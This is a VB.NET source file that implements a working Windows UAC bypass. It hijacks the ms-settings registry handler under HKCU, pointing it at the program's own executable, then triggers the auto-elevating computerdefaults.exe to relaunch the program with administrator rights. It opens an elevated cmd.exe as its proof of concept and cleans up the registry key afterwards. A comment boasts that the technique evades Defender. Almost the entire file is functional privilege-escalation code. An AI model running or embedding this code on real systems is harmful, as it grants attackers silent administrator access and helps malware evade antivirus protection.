Imports Microsoft.Win32
Imports System
Imports System.Collections.Generic
Imports System.Diagnostics
Imports System.Linq
Imports System.Management
Imports System.Security.Principal
Imports System.Text
Imports System.Threading
Imports System.Threading.Tasks

Namespace UACME.uac
	Friend Class regen
		Public Shared Sub BoopMe()
			Try
				If Not Settings.IsUserAnAdmin() Then
					Bypass.RegBoop()

				ElseIf Settings.IsUserAnAdmin() Then
					'this method seems to bypass defender
					'5-02-2021 and binary is not flagged
					Dim WhatToElevate As String = "cmd.exe" ' cmd.exe will be elevated as an example and PoC
				   ' Thread.Sleep(5000);
					Process.Start("cmd.exe", "/c start " & WhatToElevate)
					Dim uac_clean As RegistryKey = Registry.CurrentUser.OpenSubKey("Software\Classes\ms-settings", True)
					uac_clean.DeleteSubKeyTree("shell") 'deleting this is important because if we won't delete that right click of windows will break.
					uac_clean.Close()
				End If

			Catch
				Environment.Exit(0)
			End Try
		End Sub
		#Region "uac_bypass"
		Public Class Bypass
			Public Shared Sub RegBoop()
				Dim windowsPrincipal As New WindowsPrincipal(WindowsIdentity.GetCurrent())
				If Not windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator) Then
					Bypass.Zoop("Classes")
					Bypass.Zoop("Classes\ms-settings")
					Bypass.Zoop("Classes\ms-settings\shell")
					Bypass.Zoop("Classes\ms-settings\shell\open")
					Dim registryKey As RegistryKey = Bypass.Zoop("Classes\ms-settings\shell\open\command")
					Dim cpath As String = System.Reflection.Assembly.GetExecutingAssembly().Location
					registryKey.SetValue("", cpath, RegistryValueKind.String)
					registryKey.SetValue("DelegateExecute", 0, RegistryValueKind.DWord)
					registryKey.Close()
					Try
						Process.Start(New ProcessStartInfo With {.CreateNoWindow = True, .UseShellExecute = False, .FileName = "cmd.exe", .Arguments = "/c start computerdefaults.exe"})
					Catch
					End Try
					Process.GetCurrentProcess().Kill()
				Else
					Dim registryKey2 As RegistryKey = Bypass.Zoop("Classes\ms-settings\shell\open\command")
					registryKey2.SetValue("", "", RegistryValueKind.String)
				End If
			End Sub

			Public Shared Function Zoop(ByVal x As String) As RegistryKey
				Dim RegKey As RegistryKey = Registry.CurrentUser.OpenSubKey("Software\" & x, True)
				Dim flag As Boolean = Not Bypass.Check(RegKey)
				If flag Then
					RegKey = Registry.CurrentUser.CreateSubKey("Software\" & x)
				End If
				Return RegKey
			End Function

			Public Shared Function Check(ByVal k As RegistryKey) As Boolean
				Dim flag As Boolean = k Is Nothing
				Return Not flag
			End Function

			Private Shared Function GetMangementObject(ByVal className As String) As ManagementObject
				Dim managementClass As New ManagementClass(className)
				Try
					For Each managementBaseObject As ManagementBaseObject In managementClass.GetInstances()
						Dim managementObject As ManagementObject = CType(managementBaseObject, ManagementObject)
						Dim flag As Boolean = managementObject IsNot Nothing
						If flag Then
							Return managementObject
						End If
					Next managementBaseObject
				Catch
				End Try
				Return Nothing
			End Function

			Public Shared Function GetVersion() As String
				Dim result As String
				Try
					Dim ManageObj As ManagementObject = Bypass.GetMangementObject("Win32_OperatingSystem")
					Dim flag As Boolean = ManageObj Is Nothing
					If flag Then
						result = String.Empty
					Else
						result = (TryCast(ManageObj("Version"), String))
					End If
				Catch ex As Exception
					result = String.Empty
				End Try
				Return result
			End Function
		End Class
		#End Region

	End Class
End Namespace

